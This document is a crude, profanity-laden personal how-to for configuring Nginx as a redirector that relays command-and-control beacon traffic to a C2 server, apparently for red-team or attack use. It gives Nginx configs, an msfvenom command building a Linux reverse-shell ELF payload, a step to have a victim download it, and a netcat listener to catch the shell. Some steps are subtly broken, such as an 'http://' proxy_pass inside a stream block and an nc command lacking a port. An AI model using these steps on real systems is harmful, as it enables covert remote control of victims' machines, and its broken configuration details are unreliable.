# Setting up Nginx for TCP proxy 

1. First off this shit is stupid, nginx only knows how to deal with HTTP traffig and beacon traffic can sometimes be encrypted by defualt making it hard for Nginx to deal with. There for we are going to have to not only set up our `proxy_reverse` but also configure TCP on the server if we want COMs to work all the way with out the use of ssl certs
2. To start lests install Nginx
    ```bash
    sudo apt install nginx 
    ```
3. Now lets modify our config file which might no exist 
    ```bash 
    sudo vim /etc/nginx/conf.d/lp_proxy.conf
    ```
4. Paste the follwing in `lp_proxy.conf`
    ```nginx
    server {
        listen 80;
        listen [::]:80;

        server_name <serverIP-OR-ServerDNSname>;

        location / {
            proxy_pass http://<parrot-c2-ip>;
        }
    }
    ```
4. Now lets add the TCP rules to allow us to handle the beacons
    ```bash
    sudo vim /etc/nginx/nginx.conf
    ```
5. Paste the following Bellow `http {...}`
    ```nginx
    stream {
        log_format posh '$remote_addr [$time_local] '
        '$protocol $status $bytes_sent $bytes_received '
        '$session_time "$upstream_addr" '
        '"$upstream_bytes_sent" "$upstream_bytes_received" "$upstream_connect _time"';
    
        server {
            listen 8080;

            proxy_pass http://<Parrot-IP>;

            access_log /var/log/nginx/tcp_access.log;
            error_log /var/log/nginx/tcp_error.log;

        }


    }
    ```
5. Now lets reload Nginx with the new conf figles 
    ```bash 
    sudo nginx -s reload
    ```
    or 
    ```bash 
    sudo systemctl restart nginx.service
    ```
6. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
    ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.178.132 LPORT=8080 -a x64 -f elf > yup.elf
    ```
    > **NOTE:** Follow the same setup if you are using poshc2 for you bind port, probably 
7. Host your payload however and download on victim 
8. Now if you are running msfvenom start you `nc` listener to catch your beacon.
    ```bash
    sudo nc -lnvp
    ```
9.  tada you have a beacon shelley, fuck you.